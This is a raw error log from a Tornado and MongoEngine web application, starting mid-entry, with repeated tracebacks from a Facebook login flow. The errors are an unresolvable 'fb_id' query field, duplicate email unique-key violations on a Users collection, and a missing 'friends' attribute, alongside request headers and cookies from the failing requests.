'max-age=0', 'X-Real-Ip': '109.158.140.86'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 49, in _on_login
    c_user = User.objects(fb_id=user['id']).get()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 796, in get
    self.limit(2)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 1101, in limit
    self._cursor.limit(n)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 583, in _cursor
    self._cursor_obj = self._collection.find(self._query,
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 379, in _query
    self._mongo_query = self._query_obj.to_query(self._document)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 205, in to_query
    query = query.accept(QueryCompilerVisitor(document))
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 270, in accept
    return visitor.visit_query(self)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 162, in visit_query
    return QuerySet._transform_query(self.document, **query.query)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 701, in _transform_query
    fields = QuerySet._lookup_field(_doc_cls, parts)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 639, in _lookup_field
    % field_name)
InvalidQueryError: Cannot resolve field "fb_id"
ERROR:root:500 GET /login?code=AQDVVzknVLErnzJ0EK2T8z2nzhRGnMb9M--H0_lq-If-hTJUSwFknd4jgXTwSOsXMCwRyEqRWKRyIc0FWQVmGGfWeiBFtktdUJr44xg1H8kLxz3RsC6c6VYbrI1ZYMGKXn-qZmSFbF9TbU9omu44e3TJCL3i5phZ2FyfKXkdr65a-Hiw03tiBbKnjbINoIkNieD52MMw9j-pPcyJeScUJaIQ (127.0.0.1) 871.71ms
ERROR:root:Uncaught exception GET /login?code=AQAIuY-8bL9e_lL5Zc2OuORSr0ItgdAy4YaovyAR5p4BG5IADPxbsiApkUSkO2iGG9eFmPzoP8a8EsgNmtneJGxKdl55JEVZa0WS7pMWeUwVpVGpjI0ccjF3Ku60K-Hv6iQ5AI2w4OD7GLTjq2bZ1bR3bJEVMJHdDcM3wtOhIshY_7pgEtkZfkVw5UmvBq9xvzXYuolshEDweGlBJ8YH8Uhv (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login?code=AQAIuY-8bL9e_lL5Zc2OuORSr0ItgdAy4YaovyAR5p4BG5IADPxbsiApkUSkO2iGG9eFmPzoP8a8EsgNmtneJGxKdl55JEVZa0WS7pMWeUwVpVGpjI0ccjF3Ku60K-Hv6iQ5AI2w4OD7GLTjq2bZ1bR3bJEVMJHdDcM3wtOhIshY_7pgEtkZfkVw5UmvBq9xvzXYuolshEDweGlBJ8YH8Uhv', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Referer': 'http://www.intheory.co.uk/', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac; user_type="dHdpdHRlcg==|1348569281|7ce83e6495219c2e8e4159d4fab41098579a4f6d"; __utma=188782963.1731359073.1348049186.1348501288.1348566979.7; __utmb=188782963.34.10.1348566979; __utmc=188782963; __utmz=188782963.1348501288.6.3.utmcsr=localhost:8888|utmccn=(referral)|utmcmd=referral|utmcct=/'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 50, in _on_login
    c_user = User.objects(fb_id=user['id']).get()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 796, in get
    self.limit(2)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 1101, in limit
    self._cursor.limit(n)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 583, in _cursor
    self._cursor_obj = self._collection.find(self._query,
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 564, in _collection
    self._ensure_indexes()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 476, in _ensure_indexes
    if index_types and '_types' in self._query and not types_indexed:
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 379, in _query
    self._mongo_query = self._query_obj.to_query(self._document)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 205, in to_query
    query = query.accept(QueryCompilerVisitor(document))
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 270, in accept
    return visitor.visit_query(self)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 162, in visit_query
    return QuerySet._transform_query(self.document, **query.query)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 701, in _transform_query
    fields = QuerySet._lookup_field(_doc_cls, parts)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 639, in _lookup_field
    % field_name)
InvalidQueryError: Cannot resolve field "fb_id"
ERROR:root:500 GET /login?code=AQAIuY-8bL9e_lL5Zc2OuORSr0ItgdAy4YaovyAR5p4BG5IADPxbsiApkUSkO2iGG9eFmPzoP8a8EsgNmtneJGxKdl55JEVZa0WS7pMWeUwVpVGpjI0ccjF3Ku60K-Hv6iQ5AI2w4OD7GLTjq2bZ1bR3bJEVMJHdDcM3wtOhIshY_7pgEtkZfkVw5UmvBq9xvzXYuolshEDweGlBJ8YH8Uhv (127.0.0.1) 962.10ms
ERROR:root:Uncaught exception GET /login?code=AQDgM9ujrhY-Ia_aJcjs-iwNiy66TZxuOMEqWhonu2MgBbswCxhZdEzP1MetOleiPONkjtzh8CDI9aNRo_-t0WNCZHlgXqba-92FVq6ZaxF5SwWFZjfQZxkZzy0Li2hkiAbFfdKtCBX0byWAPygsSezglbC9G8lR_y2J8bcI-i-MqR4Q-bIlojj-KOgEH7dZeuZ62G0LzJ_YCI72ASoSIaiL (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login?code=AQDgM9ujrhY-Ia_aJcjs-iwNiy66TZxuOMEqWhonu2MgBbswCxhZdEzP1MetOleiPONkjtzh8CDI9aNRo_-t0WNCZHlgXqba-92FVq6ZaxF5SwWFZjfQZxkZzy0Li2hkiAbFfdKtCBX0byWAPygsSezglbC9G8lR_y2J8bcI-i-MqR4Q-bIlojj-KOgEH7dZeuZ62G0LzJ_YCI72ASoSIaiL', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Referer': 'http://intheory.co.uk/', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac; user_type="dHdpdHRlcg==|1348569281|7ce83e6495219c2e8e4159d4fab41098579a4f6d"; __utma=188782963.1731359073.1348049186.1348501288.1348566979.7; __utmb=188782963.35.10.1348566979; __utmc=188782963; __utmz=188782963.1348501288.6.3.utmcsr=localhost:8888|utmccn=(referral)|utmcmd=referral|utmcct=/'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 49, in _on_login
    c_user = User.objects(fb_id=user['id']).get()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 796, in get
    self.limit(2)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 1101, in limit
    self._cursor.limit(n)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 583, in _cursor
    self._cursor_obj = self._collection.find(self._query,
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 564, in _collection
    self._ensure_indexes()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 476, in _ensure_indexes
    if index_types and '_types' in self._query and not types_indexed:
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 379, in _query
    self._mongo_query = self._query_obj.to_query(self._document)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 205, in to_query
    query = query.accept(QueryCompilerVisitor(document))
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 270, in accept
    return visitor.visit_query(self)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 162, in visit_query
    return QuerySet._transform_query(self.document, **query.query)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 701, in _transform_query
    fields = QuerySet._lookup_field(_doc_cls, parts)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 639, in _lookup_field
    % field_name)
InvalidQueryError: Cannot resolve field "fb_id"
ERROR:root:500 GET /login?code=AQDgM9ujrhY-Ia_aJcjs-iwNiy66TZxuOMEqWhonu2MgBbswCxhZdEzP1MetOleiPONkjtzh8CDI9aNRo_-t0WNCZHlgXqba-92FVq6ZaxF5SwWFZjfQZxkZzy0Li2hkiAbFfdKtCBX0byWAPygsSezglbC9G8lR_y2J8bcI-i-MqR4Q-bIlojj-KOgEH7dZeuZ62G0LzJ_YCI72ASoSIaiL (127.0.0.1) 926.58ms
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 77, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.friends.append(uf)
AttributeError: 'User' object has no attribute 'friends'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 77, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.friends.append(uf)
AttributeError: 'User' object has no attribute 'friends'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 77, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.friends.append(uf)
AttributeError: 'User' object has no attribute 'friends'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 77, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.friends.append(uf)
AttributeError: 'User' object has no attribute 'friends'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 77, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.friends.append(uf)
AttributeError: 'User' object has no attribute 'friends'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 77, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.friends.append(uf)
AttributeError: 'User' object has no attribute 'friends'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 77, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.friends.append(uf)
AttributeError: 'User' object has no attribute 'friends'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 77, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.friends.append(uf)
AttributeError: 'User' object has no attribute 'friends'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 77, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 93, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 77, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 93, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 77, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 93, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 77, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 93, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 78, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 94, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 78, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 94, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 78, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 94, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 78, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
